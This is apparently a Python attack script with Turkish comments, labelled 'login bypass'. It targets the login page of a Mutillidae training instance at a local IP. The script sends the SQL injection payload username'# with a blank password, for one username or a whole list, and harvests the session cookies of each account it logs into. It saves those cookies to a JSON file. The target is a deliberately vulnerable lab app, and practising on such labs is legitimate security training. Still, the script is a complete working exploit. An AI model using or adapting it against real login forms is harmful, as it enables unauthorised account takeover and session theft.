import os
import threading
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import sys
import argparse
import json

parser = argparse.ArgumentParser(description='login bypass',usage="tool kullanım rehberi")
parser.add_argument("-u", "--username", metavar="", help="kullanıcı adı")
parser.add_argument("-ul", "--usernameList",metavar="" ,help="kullanıcı adı listesi belirtin")
args = parser.parse_args()

class Interface():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {self.red}{message}{self.end}")
        sys.exit(1)
        
    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.green}{message}{self.end}")

def Terminali_Temizle(): 
    if os.name == 'nt':
        os.system("cls")
    else: 
        os.system("clear")

ua = UserAgent()
def session_başlat():
    global session
    ua.firefox
    user_agent = ua.random # rastgele bir user agent alıyoruz
    headers = {'User-Agent':user_agent}
    session = requests.Session()    
    session.headers.update(headers)

global output
output = Interface()
#======================
ip = "192.168.1.41" # mutillidae ip'sini yazın / write of your mutillidae ip
#======================
login = f"http://{ip}/mutillidae/index.php?page=login.php"

def kontrol(): # makineye bağlanmada ve verilen parametrelerde herhangi bir sorun olup olmadığını kontrol ediyoruz eğer bir sorun varsa kodu sonlandırıyoruz
    if args.username and args.usernameList:
        output.error("tek bir seçenek seçin")
        
    if not args.username and not args.usernameList:
        output.error("lütfen bir kullanıcı adı yada kullanıcı listesi belirtin")
    try:   
        requests.get(login,timeout=1)
    except:
        output.error(f"bağlantı başarısız lütfen makinanın açık olduğundan ve ip adresini doğru yazdığınızdan emin olun !!!")

cookies = {}
data = {}
cookie_list = []
sözlük = {}

def main():
    # login olma sayfasındaki name değerlerini çekiyoruz bunlar sayesinde siteye veri göndericez
    içerik = requests.get(login).text
    input = BeautifulSoup(içerik,'html.parser').find_all("input")
    form = BeautifulSoup(içerik,'html.parser').find_all("form")
    if not input or not form:
        output.error("input alanı yada gönderme butonu bulunamadı kodu siteye özel düzenleyin")

    method = [str(i["method"]).lower() for i in form]

    alındı = False
    for i in input:
        if i["type"] == "submit" or i["type"] == "button":
            if alındı:
                continue
            data[i['name']] = i["value"]
            alındı = True
        else:
            if i['name']:
                data[i['name']] = ""
    #===============================
    def username(username):
        Terminali_Temizle()
        session_başlat()
        payload = f"{username}'#" 
        #print(data.keys()) # dict_keys(['username', 'password', 'login-php-submit-button'])
        data["username"] = payload
        # şifre alanı boş olacak
        if method[0] == "get": # print(method) : ['post'] ---- print(method[0]) : post
            çıktı = session.get(login,data=data)
        else:
            çıktı = session.post(login,data=data)
        
        successful_user_login = f"User: {username}"
        successful_admin_login = f"Admin: {username}"
        sayfa_kodları = çıktı.text
        if successful_user_login in sayfa_kodları or successful_admin_login in sayfa_kodları:

            for cookie in session.cookies:
                cookies.update({cookie.name: cookie.value})

            output.info(f"kullanılan payload --> {payload}")
            output.success(f"{username} cookie değeri :")
            output.info(cookies)
        else:
            output.error("kullanıcı mevcut değil")
        session.close()
        
    def multiple(liste):
        Terminali_Temizle()
        
        with open(liste,"r") as dosya:
            usernames_list = []
            usernames = dosya.read().splitlines()
            [usernames_list.append(i) for i in usernames if i not in usernames_list] # tekrar eden değerleri kaldırıyoruz
        
        for user in usernames_list:
            session_başlat()
            #=======================
            payload = f"{user}'#"
            data["username"] = payload
            # password kısmı boş olucak
            #=======================
            if method[0] == "get":
                çıktı = session.get(login,data=data)
            else:
                çıktı = session.post(login,data=data)
            #=======================
            successful_user_login = f"User: {user}"
            successful_admin_login = f"Admin: {user}"
            sayfa_kodları = çıktı.text
            
            if successful_user_login in sayfa_kodları or successful_admin_login in sayfa_kodları:
                for cookie in session.cookies: 
                    cookies.update({cookie.name: cookie.value})
                    
                output.info(f"kullanılan payload --> {payload}")
                output.success(f"{user} cookie değeri :")
                output.info(cookies)
                kopya = cookies.copy() # burayı kopyalamayıp direk sözlüğe attığımda aynı değerler sözlük içine yazıldı bu yüzden kopyalayarak yazdım
                sözlük[cookies['uid']] = kopya
                cookies.clear() # cookie değerlerini sözlüğe kayıt ettik önceki değerleri siliyoruz
                print("========================")

    if args.username:
        username(args.username)
    else:
        kullanici_listesi = args.usernameList
        t = threading.Thread(target=multiple,args=(kullanici_listesi,)) #kodun hızlı çalışması için
        t.start()
        t.join() # fonksiyondaki işlemler bitmeden diğer işlemlere geçme demek
if __name__ == "__main__":
    kontrol() # önce kontrol ediyoruz bir sorun varsa kod sonlanacaktır eğer sorun yoksa main fonksiyonu başlatılır
    main()

if args.usernameList: # eğer burayı direk yazsaydık kullanıcı username adlı fonksiyonu çalıştırdıgında burası tekrar çalışırdı ve json dosyasında kullanıcıların bilgisi varsa sıfırlanırdı
    keys = [int(i) for i in sözlük.keys()]
    for i in range(len(keys)-1,0,-1): # kısaca sort() fonksiyonu kullanılabilir
        for w in range(i):
            if keys[w] > keys[w+1]:
                keys[w],keys[w+1] = keys[w+1],keys[w]

    sıralı_sözlük = []
    [sıralı_sözlük.append({key: sözlük[str(key)]}) for key in keys]

    with open("user-information.json","w",encoding='utf-8') as json_file:
        json.dump(sıralı_sözlük,json_file,ensure_ascii=False,indent=4) # indent=4 json dosyasını okunabilir bir şekilde yazdırır 
